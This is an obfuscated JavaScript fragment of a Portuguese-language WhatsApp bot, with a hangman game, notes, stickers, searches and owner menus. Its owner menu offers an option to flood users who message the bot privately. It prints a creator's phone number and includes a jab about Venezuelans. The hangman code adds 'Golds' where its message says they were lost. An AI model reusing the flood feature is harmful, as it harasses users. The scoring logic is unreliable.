                  _0x799bb8();
                  var _0x2bc4c6 = _0x3bd584[0].forca_ofc[0];
                  _0x3bd584[0].forca_inc = true;
                  _0x33e29e(_0x3bd584);
                  await sleep(300);
                  linha_fr = " ";
                  for (_0xc3d45a of _0x2bc4c6.palavra) {
                    linha_fr += " " + _0xc3d45a;
                  }
                  rsp_fr = "- Jogo da forca - " + _0x2bc4c6.palavra_ofc.length + " Letras\n\nTema: " + _0x2bc4c6.tema + "\n\nDica: " + _0x2bc4c6.dica + "\n\n|________\n       _¦_\n\n\n\n\n\n\n\n" + linha_fr + "\n\n_____________________\n\n_- JOGO INICIADO -_\n\nUse " + _0x1d93be + "r-f letra que talvez exista por sua observação.\n\nOu " + _0x1d93be + "r-f nome todo\n\n_____________________\n";
                  _0x403602(rsp_fr);
                }
              } catch (_0x7b6407) {
                console.log(_0x7b6407);
              }
              break;
            case "r-forca":
            case "r-f":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x3bd584[0].forca_inc) {
                return _0x403602("O jogo não foi iniciado.\nDigite " + _0x1d93be + "iniciar_forca");
              }
              if (!_0x1d6557.toLowerCase().trim()) {
                return _0x403602("Digite a letra que deseja responder..");
              }
              var _0x326ba7 = _0x5397e2.trim().toLowerCase();
              if (ANT_LTR_MD_EMJ(_0x326ba7) || Number(_0x326ba7)) {
                return _0x403602("Não pode letras modificadas, nem emoji, nem números..");
              }
              if (_0x1d6557.trim().length == 2) {
                return _0x403602("Digite letra por letra para tentar adivinhar, ou acerte a palavra toda, boa sorte...");
              }
              _0x2bc4c6 = _0x3bd584[0].forca_ofc[0];
              if (_0x2bc4c6.escreveu.indexOf(_0x326ba7) >= 0) {
                return _0x403602("Esta letra já foi utilizada..");
              }
              var _0x280f32 = rggold.map(_0x12ab0d => _0x12ab0d.grupo).indexOf(_0x4f1071);
              var _0x43cf52 = rggold[_0x280f32].usus.map(_0x27d1a5 => _0x27d1a5.id).indexOf(_0x32e455);
              var _0x430b19 = _0x2bc4c6.palavra_ofc.includes(_0x326ba7) ? 0 : 1;
              var _0x4327ce = _0x3bd584[0].forca_ofc[0].erros;
              _0x2bc4c6.escreveu.push(_0x326ba7);
              _0x33e29e(_0x3bd584);
              PSC = [];
              if (_0x2bc4c6.palavra_ofc.indexOf(_0x326ba7) >= 0) {
                for (_0xc3d45a = 0; _0xc3d45a < _0x2bc4c6.palavra_ofc.length; _0xc3d45a++) {
                  if (_0x2bc4c6.palavra_ofc[_0xc3d45a] == _0x326ba7) {
                    PSC.push(_0xc3d45a);
                    _0x2bc4c6.acertos += 1;
                  }
                }
                _0x33e29e(_0x3bd584);
                for (_0xc3d45a of PSC) {
                  _0x2bc4c6.palavra[_0xc3d45a] = _0x326ba7;
                  _0x33e29e(_0x3bd584);
                }
              }
              await sleep(300);
              linha_fr = " ";
              for (_0xc3d45a of _0x2bc4c6.palavra) {
                linha_fr += " " + _0xc3d45a;
              }
              letra_ut = " ";
              for (_0xc3d45a of _0x2bc4c6.escreveu) {
                letra_ut += _0xc3d45a + ", ";
              }
              var _0x2686d0 = "- Jogo da forca - " + _0x2bc4c6.palavra_ofc.length + " Letras\n\nTema: " + _0x2bc4c6.tema + "\n\nDica: " + _0x2bc4c6.dica + "\n\n__________-_\n         _|_\n\n        " + (_0x4327ce + _0x430b19 >= 1 ? "🤡" : "") + "\n      " + (_0x4327ce + _0x430b19 >= 2 ? "👈" : "") + " " + (_0x4327ce + _0x430b19 >= 3 ? "👉" : "") + "  \n         " + (_0x4327ce + _0x430b19 >= 4 ? "👖" : "") + "\n         " + (_0x4327ce + _0x430b19 >= 5 ? "👞" : "") + " " + (_0x4327ce + _0x430b19 >= 6 ? "👞" : "") + "\n\n" + linha_fr + "\n\n___-________-_____\n\nLetras ja utilizadas: " + letra_ut + "\n___-________-_____\n";
              if (_0x1d6557.length > 2) {
                _0x403602("Humm, espertinho quer acertar a palavra toda");
              }
              await sleep(500);
              if (_0x2bc4c6.palavra_ofc.indexOf(_0x326ba7) >= 0 || _0x326ba7.length > 2 && _0x326ba7 == _0x2bc4c6.palavra_ofc) {
                _0x403602("" + (_0x326ba7.length > 2 ? "Você acertou a palavra toda e ganhou" + (_0x3fb600 ? " 10 Golds," : " ") + "bom menino(a), irei resetar o jogo..." : _0x2bc4c6.acertos == _0x2bc4c6.palavra_ofc.length ? "Parabéns, toda palavra foi concluída : < " + _0x2bc4c6.palavra_ofc + " >" + (_0x3fb600 ? " você recebeu 5 Golds, por ser o último..," : " ") + "irei resetar o jogo.." : "Você acertou uma letra e ganhou" + (_0x3fb600 ? " 2 Golds " : " ") + "continue assim.."));
                if (_0x3fb600) {
                  rggold[_0x280f32].usus[_0x43cf52].Golds += _0x1d6557.length > 2 ? 10 : _0x2bc4c6.acertos == _0x2bc4c6.palavra_ofc.length ? 5 : 2;
                  _0x61f85(rggold);
                }
                if (_0x326ba7.length > 2 || _0x2bc4c6.acertos == _0x2bc4c6.palavra_ofc.length) {
                  return _0x799bb8();
                }
                await sleep(200);
                _0x403602(_0x2686d0);
              } else {
                _0x403602("" + (_0x326ba7.length > 2 ? "Infelizmente você perdeu" + (_0x3fb600 ? " 3 Golds" : "") + ", errou a palavra toda, deveria ter tentado letra por letra né, irei resetar o jogo.." : _0x4327ce + _0x430b19 == 6 ? "Aa, você completou 6 Erros, e perdeu " + (_0x3fb600 ? "2 Golds infelizmente," : ", ") + "irei resetar o jogo.." : "Você Errou, e perdeu " + (_0x3fb600 ? "2 Golds" : "") + " 😥.."));
                if (_0x3fb600) {
                  rggold[_0x280f32].usus[_0x43cf52].Golds += 2;
                  _0x61f85(rggold);
                }
                _0x3bd584[0].forca_ofc[0].erros += 1;
                _0x33e29e(_0x3bd584);
                if (_0x326ba7.length > 2 || _0x4327ce + _0x430b19 == 6) {
                  return _0x799bb8();
                }
                await sleep(200);
                _0x403602(_0x2686d0);
              }
              break;
            case "figurinhas":
              if (!_0x1d6557) {
                return _0x403602("Por favor, informe a quantidade de figurinhas que deseja que eu envie!");
              }
              if (!Number(_0x1d6557.trim()) || !_0x2a5ff3 && Number(_0x1d6557.trim()) > 5) {
                return _0x403602("Digite a quantidade de figurinhas desejada, sendo no máximo 5.");
              }
              async function _0x98a337() {
                const _0x1af4c7 = {
                  url: SITE_JEFF_APIS + "/figurinhas?apikey=" + _0x512d5e
                };
                const _0x27ff3b = {
                  sticker: _0x1af4c7
                };
                _0x263319.sendMessage(_0x4f1071, _0x27ff3b);
              }
              for (let _0x3d1f1a = 0; _0x3d1f1a < _0x1d6557; _0x3d1f1a++) {
                await sleep(1000);
                _0x98a337();
              }
              break;
            case "limpar_mortos-cnt":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(_0x7e2f25);
              }
              bla = [];
              var _0xc8c122 = countMessage[countMessage.map(_0x1651dd => _0x1651dd.groupId).indexOf(_0x4f1071)].numbers;
              for (_0xc3d45a = 0; _0xc3d45a < _0xc8c122.map(_0x3806ab => _0x3806ab.id).length; _0xc3d45a++) {
                bla.push(_0xc8c122.map(_0x2917f4 => _0x2917f4.id)[_0xc3d45a]);
              }
              ;
              for (_0xc3d45a of _0x5b3ba6) {
                bla.splice(bla.indexOf(_0xc3d45a.id), 1);
              }
              ;
              for (_0xc3d45a of bla) {
                _0xc8c122.splice(_0xc8c122.indexOf(_0xc3d45a), 1);
              }
              ;
              fs.writeFileSync("./DADOS/countmsg.json", JSON.stringify(countMessage));
              _0x403602("Usuários que já foi removido, ou saiu do grupo, foi tirado do contador de mensagens..");
              break;
            case "tirar_docnt":
              if (!_0x2a5ff3) {
                return;
              }
              if (!_0xd20756) {
                return _0x403602(_0x7e2f25);
              }
              var _0x280f32 = countMessage.map(_0x34d2ba => _0x34d2ba.groupId).indexOf(_0x4f1071);
              var _0xc3d45a = countMessage[_0x280f32].numbers.map(_0x4d7a33 => _0x4d7a33.id).indexOf(_0x1d6557.trim() + "@s.whatsapp.net");
              countMessage[_0x280f32].numbers.splice(_0xc3d45a, 1);
              fs.writeFileSync("./DADOS/countmsg.json", JSON.stringify(countMessage));
              _0x403602("Usuário tirado do contador de mensagens com sucesso...");
              break;
            case "anotar":
            case "tirar_nota":
            case "rmnota":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x3dec88 == "anotar") {
                var [_0x2f9660, _0x53e269] = _0x1d6557.trim().split("|");
                if (!_0x2f9660 || !_0x53e269 || !_0x1d6557.includes("|")) {
                  return _0x403602("Digite o título da anotação e o texto que deseja anotar..\nExemplo: " + _0x1d93be + "anotar cachorro|Cachorros são bom pra comer na Venezuela...");
                }
                if (JSON.stringify(anotar).includes(_0x4f1071)) {
                  var _0x280f32 = anotar.map(_0xbbae5e => _0xbbae5e.grupo).indexOf(_0x4f1071);
                  if (JSON.stringify(anotar[_0x280f32].puxar).includes(_0x2f9660)) {
                    var _0x43cf52 = anotar[_0x280f32].puxar.map(_0x3e64b7 => _0x3e64b7.nota).indexOf(_0x2f9660);
                    if (anotar[_0x280f32].puxar[_0x43cf52].nota == _0x2f9660) {
                      return _0x403602("Esta anotação já está inclusa, utilize outro título.. Ou você pode tirar com\n" + _0x1d93be + "tirar_nota " + _0x2f9660);
                    }
                  }
                }
                if (!JSON.stringify(anotar).includes(_0x4f1071)) {
                  const _0x513fe7 = {
                    nota: _0x2f9660,
                    anotacao: _0x53e269
                  };
                  const _0x572f71 = {
                    grupo: _0x4f1071,
                    puxar: [_0x513fe7]
                  };
                  anotar.push(_0x572f71);
                  fs.writeFileSync("./DADOS/tabela/anotar.json", JSON.stringify(anotar));
                  _0x403602("Anotação registrada com sucesso...");
                } else {
                  const _0x4e35d0 = {
                    nota: _0x2f9660,
                    anotacao: _0x53e269
                  };
                  anotar[_0x280f32].puxar.push(_0x4e35d0);
                  fs.writeFileSync("./DADOS/tabela/anotar.json", JSON.stringify(anotar));
                  _0x403602("Anotação registrada com sucesso...");
                }
              } else {
                if (!_0x1d6557) {
                  return _0x403602("Digite qual anotação deseja tirar pelo título..");
                }
                if (JSON.stringify(anotar).includes(_0x4f1071)) {
                  var _0x280f32 = anotar.map(_0x40af21 => _0x40af21.grupo).indexOf(_0x4f1071);
                  if (JSON.stringify(anotar[_0x280f32].puxar).includes(_0x1d6557)) {
                    var _0x43cf52 = anotar[_0x280f32].puxar.map(_0x369357 => _0x369357.nota).indexOf(_0x1d6557);
                  }
                }
                if (anotar[_0x280f32].puxar.map(_0x2978db => _0x2978db.nota).indexOf(_0x1d6557) < 0) {
                  return _0x403602("Esta nota não está inclusa, verifique com atenção...");
                }
                anotar[_0x280f32].puxar.splice(_0x43cf52, 1);
                fs.writeFileSync("./DADOS/tabela/anotar.json", JSON.stringify(anotar));
                _0x403602("Anotação " + _0x1d6557 + " tirada com sucesso...");
              }
              break;
            case "anotacao":
            case "anotacoes":
            case "nota":
            case "notas":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (_0x3dec88 == "anotacao" || _0x3dec88 == "nota") {
                if (!_0x1d6557.trim()) {
                  return _0x403602("Digite o título da anotação que deseja puxar..");
                }
                if (!JSON.stringify(anotar).includes(_0x4f1071)) {
                  return _0x403602("Este grupo não tem nenhuma anotação...");
                }
                var _0x280f32 = anotar.map(_0x6762e6 => _0x6762e6.grupo).indexOf(_0x4f1071);
                if (!JSON.stringify(anotar[_0x280f32].puxar).includes(_0x1d6557)) {
                  return _0x403602("Não contém nenhuma anotação com este título.");
                }
                var _0x43cf52 = anotar[_0x280f32].puxar.map(_0x5afc7b => _0x5afc7b.nota).indexOf(_0x1d6557);
                _0x5b6fe5("〈 " + anotar[_0x280f32].puxar[_0x43cf52].anotacao + " 〉");
              } else {
                var _0x280f32 = anotar.map(_0x5b7c0f => _0x5b7c0f.grupo).indexOf(_0x4f1071);
                if (_0x280f32 < 0) {
                  return _0x403602("Este grupo não tem nenhuma anotação...");
                }
                var _0x280f32 = anotar.map(_0xcb272c => _0xcb272c.grupo).indexOf(_0x4f1071);
                var _0xa8ef4 = anotar[_0x280f32]?.puxar;
                txtin = "──────────────────\n\n";
                for (_0xc3d45a = 0; _0xc3d45a < _0xa8ef4?.length; _0xc3d45a++) {
                  txtin += "↝ Anotação: ⟮ " + anotar[_0x280f32]?.puxar[_0xc3d45a]?.nota + " ⟯ - 〈 " + anotar[_0x280f32]?.puxar[_0xc3d45a]?.anotacao + " 〉\n\n";
                }
                txtin += "──────────────────\n\n";
                _0x5b6fe5(txtin);
              }
              break;
            case "download-link":
              if (_0x1d6557.includes("video") || _0x1d6557.includes("mp4")) {
                const _0x1b0f76 = {
                  url: _0x1d6557
                };
                const _0x19eac7 = {
                  video: _0x1b0f76,
                  mimetype: "video/mp4"
                };
                const _0x3f6653 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x19eac7, _0x3f6653).catch(_0x5cc392 => {
                  _0x403602("Erro, visualize se este link é válido...");
                });
              } else if (_0x1d6557.includes("webp") || _0x1d6557.includes("jpg")) {
                const _0x164e6f = {
                  url: _0x1d6557
                };
                const _0x2d6824 = {
                  image: _0x164e6f
                };
                const _0x543d22 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x2d6824, _0x543d22).catch(_0x54fb5f => {
                  _0x403602("Erro, visualize se este link é válido...");
                });
              }
              break;
            case "playstore":
              if (!_0x1d6557) {
                return _0x403602("Você esqueceu de digitar após o comando.");
              }
              try {
                console.log("Fazendo solicitação à API...");
                const _0x3b9379 = await fetchJson(SITE_JEFF_APIS + "/api/playstore?nome=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                if (!_0x3b9379.pesquisa || !_0x3b9379.pesquisa.resultado || _0x3b9379.pesquisa.resultado.length === 0) {
                  return _0x403602("Nenhum resultado encontrado.");
                }
                ABC = "© • *𝐏𝐋𝐀𝐘𝐒𝐓𝐎𝐑𝐄 - 𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀*\n  • Total de resultado(s): *" + _0x3b9379.pesquisa.resultado.length + "*\n—\n";
                ABC += "" + _0x3b9379.pesquisa.resultado.map((_0x52e5c5, _0x14d205) => "*" + (_0x14d205 + 1) + ".* Nome: *" + _0x52e5c5.nome + "*\n• Desenvolvedor: *" + _0x52e5c5.desenvolvedor + "*\n• Avaliação dos usuários do aplicativo: *" + _0x52e5c5.estrelas + " Estrelas*\n• Url: *" + _0x52e5c5.link + "*").join("\n–\n");
                _0x263319.sendMessage(_0x4f1071, {
                  text: ABC,
                  contextInfo: {
                    externalAdReply: {
                      title: _0x3b9379.pesquisa.resultado[0].nome,
                      body: "Avaliação: " + _0x3b9379.pesquisa.resultado[0].estrelas + " • Desenvolvedor: " + _0x3b9379.pesquisa.resultado[0].desenvolvedor,
                      thumbnail: await getBuffer(_0x3b9379.pesquisa.resultado[0].imagem),
                      mediaType: 2,
                      sourceUrl: _0x3b9379.pesquisa.resultado[0].link
                    }
                  }
                });
              } catch (_0x31e7a7) {
                console.error("Erro:", _0x31e7a7);
                return _0x403602("Ocorreu um erro ao processar sua solicitação. Por favor, tente novamente mais tarde.");
              }
              break;
            case "grupos":
              if (!_0x1d6557.trim()) {
                return _0x403602("Digite o título, para pegar resultados de grupos de WhatsApp, referente a seu título..\nExemplo: " + (_0x1d93be + _0x3dec88) + " zoeira");
              }
              try {
                var _0x5dbda0 = [];
                bla = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/pesq_grp-whats?ttl=" + _0x1d6557 + "&apikey=" + _0x44a335);
                for (let _0xf077eb of bla) {
                  const _0x30da96 = {
                    title: _0xf077eb.LINK,
                    description: _0xf077eb.TITULO,
                    rowId: _0x1d93be + "linkdogp_revelar " + _0xf077eb.LINK
                  };
                  _0x5dbda0.push(_0x30da96);
                }
                const _0x8d7de7 = {
                  text: "Pesquisa realizada: Sobre grupos de WhatsApp",
                  footer: "Canal do Bot : https://youtube.com/@jefferson_ddos.?si=oibyuxB65ZkTMByu",
                  title: (_0xd20756 ? "Grupo" : "Usuário") + " : " + (_0xd20756 ? _0x471350 : _0x55a6ac),
                  buttonText: "Lista da pesquisa - Clique aqui!",
                  sections: [{
                    title: "Resultado da pesquisa :",
                    rows: _0x5dbda0
                  }]
                };
                _0x5352b8 = _0x8d7de7;
                _0x263319.sendMessage(_0x4f1071, _0x5352b8).catch(_0x537285 => {
                  _0x403602("Titulo não encontrado, pesquise por outro");
                });
              } catch {
                _0x403602("Titulo não encontrado, pesquise por outro");
              }
              break;
            case "infoanotacao":
              _0x263319.sendMessage(_0x4f1071, {
                text: anotacao(_0x1d93be)
              });
              break;
            case "pesquisa":
            case "pesquisar":
              bla = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/pesquisa_agora?pesq=" + _0x1d6557 + "&apikey=" + _0x44a335);
              const _0x4b5a1e = {
                text: bla.msg
              };
              const _0x3566df = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x4b5a1e, _0x3566df);
              break;
            case "cmds_de_membros":
              const _0xd93656 = {
                url: logoslink.logo
              };
              const _0x2f925a = {
                image: _0xd93656
              };
              const _0x783942 = {
                upload: _0x263319.waUploadToServer
              };
              let _0x268968 = await prepareWAMessageMedia(_0x2f925a, _0x783942);
              const _0x5f3f4f = {
                hasMediaAttachment: true,
                imageMessage: _0x268968.imageMessage
              };
              _0x263319.relayMessage(_0x4f1071, {
                interactiveMessage: {
                  header: _0x5f3f4f,
                  headerType: "IMAGE",
                  body: {
                    text: outroscmds(_0x1d93be, _0x32e455)
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                        display_text: "⚡ PING ⚡",
                        id: _0x1d93be + "ping",
                        quick_reply: "⚡ PING ⚡"
                      })
                    }]
                  }
                }
              }, {});
              break;
            case "ativarfuncoesdono":
            case "atvc_dono":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              const _0x5cf9ce = {
                title: "Sessão - ( 1 )",
                rows: [{
                  title: "" + (!_0x2ea32a ? "Ativar - para bloquear quem ligar para o bot.." : "Desativar - para bloquear quem ligar para o bot.."),
                  rowId: "" + (!_0x2ea32a ? _0x1d93be + "antiligar" : _0x1d93be + "antiligar")
                }, {
                  title: "" + (!_0x5b41aa ? "Ativar - visualização automática msg pv/gp" : "Desativar - visualização automática para ler todas mensagens pv/gp do bot.."),
                  rowId: "" + (!_0x44ddae ? _0x1d93be + "visualizarmsg" : _0x1d93be + "visualizarmsg")
                }, {
                  title: "" + (!_0x303ef4 ? "Ativar - LEITURA NO CONSOLE DE CMD/MSG" : "Desativar - LEITURA NO CONSOLE DE CMD/MSG"),
                  rowId: "" + (!_0x303ef4 ? _0x1d93be + "console" : _0x1d93be + "console")
                }, {
                  title: "" + (!_0x2129b6 ? "Ativar - Bloquear quem mandar mensagem pv.." : "Desativar - Bloquear quem mandar mensagem pv.."),
                  rowId: "" + (!_0x2129b6 ? _0x1d93be + "antipv" : _0x1d93be + "antipv")
                }, {
                  title: "" + (!_0x5346a2 ? "Ativar Floodar quem mandar mensagem pv.." : "Desativar - Floodar quem mandar mensagem pv.."),
                  rowId: "" + (!_0x5346a2 ? _0x1d93be + "antipv2" : _0x1d93be + "antipv2")
                }, {
                  title: "" + (!_0x351d91 ? "Ativar - Audio do menu.." : "Desativar - Audio do menu.."),
                  rowId: "" + (!_0x351d91 ? _0x1d93be + "audio-menu" : _0x1d93be + "audio-menu")
                }, {
                  title: "" + (!_0x167068 ? "Ativar - Verificado dos comandos.." : "Desativar - Verificado dos comandos.."),
                  rowId: "" + (!_0x167068 ? _0x1d93be + "verificado-global" : _0x1d93be + "verificado-global")
                }, {
                  title: "" + (!_0xf63551 ? "Ativar - Desligar o bot completamente.." : "Desativar - Desligar o bot completamente.."),
                  rowId: "" + (!_0xf63551 ? _0x1d93be + "botoff" : _0x1d93be + "boton")
                }, {
                  title: "Boa sorte",
                  rowId: "bla",
                  description: "Comandos de *Ativar* e *Desativar*.."
                }]
              };
              botaoale = [_0x5cf9ce];
              _0x3971c0(_0x4f1071, "Comandos de Ativar", "Dono : " + _0x55a6ac, "Ative *Conscientemente* sobre o que cada função faz..\nSão todas referente ao bot..", "Lista de Funções..", botaoale, _0x302296);
              break;
            case "menup":
            case "helpp":
            case "comandosp":
              if (_0x351d91) {
                audiomenu = await fs.readFileSync("./DADOS/usuarios/audios/menucmd.mp3");
                const _0x150353 = {
                  audio: audiomenu,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x11dc0f = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x150353, _0x11dc0f);
              }
              EnvBotao(_0x4f1071, _0x32e455, _0x263319, menu(_0x1d93be, NomeDoBot, _0x32e455), "Leia com atenção", "3|" + logoslink.logo, [_0x1d93be + "brincadeiras", "░ MENU DE BRINCADEIRAS ░", _0x1d93be + "logos", "░ MENU DE LOGOS ░", _0x1d93be + "infodono", "░ INFORMAÇÕES DO DONO ░"], _0xa6b34);
              break;
            case "verificado-global":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x167068) {
                nescessario.verificado = true;
                _0x130557(nescessario);
                _0x403602("- O Verificado foi Ativado de todos os comandos que tem, para tirar novamente só digitar o comando novamente..");
              } else if (_0x167068) {
                nescessario.verificado = false;
                _0x130557(nescessario);
                _0x403602("- O Verificado de todos os menu / comando, foi Desativado, para ativar novamente só digitar o comando novamente..");
              }
              break;
            case "botoes":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (botoes_) {
                botoes_ = false;
                nescessario.botoes_ = false;
                _0x130557(nescessario);
                _0x403602("Botoes Desativado com sucesso, para ativar novamente só digitar o comando denovo.");
              } else if (!botoes_) {
                botoes_ = true;
                nescessario.botoes_ = true;
                _0x130557(nescessario);
                _0x403602("Botoes Ativado com sucesso, para desativar novamente só digitar o comando denovo.");
              }
              break;
            case "audio-menu":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x351d91) {
                nescessario.menu_audio = true;
                _0x130557(nescessario);
                _0x403602("- O Áudio foi ativado para o menu _- COM SUCESSO - _\n\nSe quiser Desativar - Só digitar o comando novamente");
              } else if (_0x351d91) {
                nescessario.menu_audio = false;
                _0x130557(nescessario);
                _0x403602("- O Áudio foi Desativado do menu _- COM SUCESSO - _\n\nSe quiser Ativar - Só digitar o comando novamente");
              }
              break;
            case "console":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x303ef4) {
                nescessario.consoleoff = true;
                _0x130557(nescessario);
                _0x403602("- O comando de tirar o console foi ativado _- COM SUCESSO - _ Agora não verá mais os comandos nem mensagem dadas no console, mas funcionará perfeitamente, ok?, é bom para evitar banimento de spam no heroku.\n\nSe quiser Desativar - Só digitar o comando novamente");
              } else if (_0x303ef4) {
                nescessario.consoleoff = false;
                _0x130557(nescessario);
                _0x403602("- O comando de tirar o console foi Desativado  _- COM SUCESSO - _ Agora verá os comandos e mensagens dadas no console, mas se for utilizar no heroku, recomendo ativar. é bom para evitar banimento de spam no heroku.\n\nSe quiser Ativar - Só digitar o comando novamente");
              }
              break;
            case "logos":
            case "menulogo":
            case "menulogos":
              const _0x19eefb = {
                url: logoslink.logo
              };
              const _0x2e8ae3 = {
                quoted: _0x302296
              };
              await _0x263319.sendMessage(_0x4f1071, {
                image: _0x19eefb,
                caption: menulogos(_0x1d93be, _0x32e455)
              }, _0x2e8ae3);
              break;
            case "menuadm":
            case "menud":
              try {
                if (botoes_) {
                  const _0x182a14 = {
                    url: logoslink.logo
                  };
                  const _0x1f9d5c = {
                    image: _0x182a14
                  };
                  const _0x1856ee = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x52f6fe = await prepareWAMessageMedia(_0x1f9d5c, _0x1856ee);
                  const _0x4ad050 = {
                    hasMediaAttachment: true,
                    imageMessage: _0x52f6fe.imageMessage
                  };
                  await _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      header: _0x4ad050,
                      headerType: "IMAGE",
                      body: {
                        text: adms(_0x1d93be, _0x32e455)
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "░ ATIVAÇÕES ADM ░",
                            id: _0x1d93be + "ativacoes_adm",
                            quick_reply: "ATIVAÇÕES DO GRUPO"
                          })
                        }, {
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "░ ÁUDIO DE INFORMAR SOBRE O DONO ░",
                            id: _0x1d93be + "infobot",
                            quick_reply: "░ ÁUDIO DE INFORMAR SOBRE O DONO ░"
                          })
                        }, {
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "░ INFORMAÇÕES DO DONO ░",
                            id: _0x1d93be + "owner",
                            quick_reply: "░ INFORMAÇÕES DO DONO ░"
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x167cf4 = {
                    url: logoslink.logo
                  };
                  const _0x25fcdc = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, {
                    image: _0x167cf4,
                    caption: adms(_0x1d93be, _0x32e455)
                  }, _0x25fcdc);
                }
              } catch (_0x1b5056) {
                _0x403602(_0x1b5056);
              }
              break;
            case "menudono":
            case "menudn":
              try {
                if (botoes_) {
                  const _0xc8c6aa = {
                    url: logoslink.logo
                  };
                  const _0x15e253 = {
                    image: _0xc8c6aa
                  };
                  const _0x360d88 = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x1b7fe6 = await prepareWAMessageMedia(_0x15e253, _0x360d88);
                  const _0x55bcb4 = {
                    hasMediaAttachment: true,
                    imageMessage: _0x1b7fe6.imageMessage
                  };
                  await _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      header: _0x55bcb4,
                      headerType: "IMAGE",
                      body: {
                        text: menudono(_0x1d93be, _0x32e455)
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "░ ATIVAÇÕES DONO ░",
                            id: _0x1d93be + "ativacoes_dono",
                            quick_reply: "░ ATIVAÇÕES DONO ░"
                          })
                        }, {
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "░ DONO ░",
                            id: _0x1d93be + "owner",
                            quick_reply: "░ DONO ░"
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x7b5720 = {
                    url: logoslink.logo
                  };
                  const _0x16e71d = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, {
                    image: _0x7b5720,
                    caption: menudono(_0x1d93be, _0x32e455)
                  }, _0x16e71d);
                }
              } catch (_0x1da6ed) {
                _0x403602(_0x1da6ed);
              }
              break;
            case "efeitosimg":
            case "efeitos":
            case "efeitoimg":
            case "efeitosmarcar":
              const _0x5aaf93 = {
                url: logoslink.logo
              };
              const _0x418c2e = {
                quoted: _0x302296
              };
              await _0x263319.sendMessage(_0x4f1071, {
                image: _0x5aaf93,
                caption: efeitos(_0x1d93be, _0x32e455)
              }, _0x418c2e);
              break;
            case "owner":
            case "odono":
            case "dono":
            case "infodono":
              const _0x206ee7 = {
                url: logoslink.logo
              };
              const _0x4c4a55 = {
                image: _0x206ee7
              };
              const _0x256369 = {
                upload: _0x263319.waUploadToServer
              };
              let _0x59c8a5 = await prepareWAMessageMedia(_0x4c4a55, _0x256369);
              numerodn = numerodono_ofc;
              const _0x2d6c7f = {
                hasMediaAttachment: true,
                imageMessage: _0x59c8a5.imageMessage
              };
              _0x263319.relayMessage(_0x4f1071, {
                interactiveMessage: {
                  header: _0x2d6c7f,
                  headerType: "IMAGE",
                  body: {
                    text: infodono(_0x1d93be, numerodn, NomeDoBot, NickDono, _0x32e455)
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "⟩ DONO ⟨",
                        merchant_url: "https://wa.me/+" + _0x3a52d1,
                        url: "https://wa.me/+" + _0x3a52d1
                      })
                    }]
                  }
                }
              }, {});
              break;
            case "criador":
              const _0x2f2b41 = {
                text: "🧙‍♂️",
                key: _0x302296.key
              };
              const _0x466228 = {
                react: _0x2f2b41
              };
              _0x263319.sendMessage(_0x4f1071, _0x466228);
              const _0x2d58d7 = "\n       \n╭───────────────┐\n├ INFORMAÇÕES DO MEU CRIADOR OFC\n├───────────────\n│ Solicitou o CMD: @" + _0x32e455.split("@")[0] + "\n├───────────────┐\n├ NICK CRIADOR: @JEFFERSON_DDOS\n│\n│ NUMERO: wa.me/553299240466\n│\n╰─────────────╯\n    ";
              const _0x5c4bbf = "https://telegra.ph/file/eb2db630bb2b6ba6ffbd8.jpg";
              if (botoes_) {
                const _0x4d93ac = {
                  url: _0x5c4bbf
                };
                const _0x40862f = {
                  image: _0x4d93ac
                };
                const _0x3418b2 = {
                  upload: _0x263319.waUploadToServer
                };
                let _0x10f2f9 = await prepareWAMessageMedia(_0x40862f, _0x3418b2);
                numerodn = numerodono_ofc;
                const _0x588981 = {
                  hasMediaAttachment: true,
                  imageMessage: _0x10f2f9.imageMessage
                };
                const _0x225ca8 = {
                  text: _0x2d58d7
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    header: _0x588981,
                    headerType: "IMAGE",
                    body: _0x225ca8,
                    nativeFlowMessage: {
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
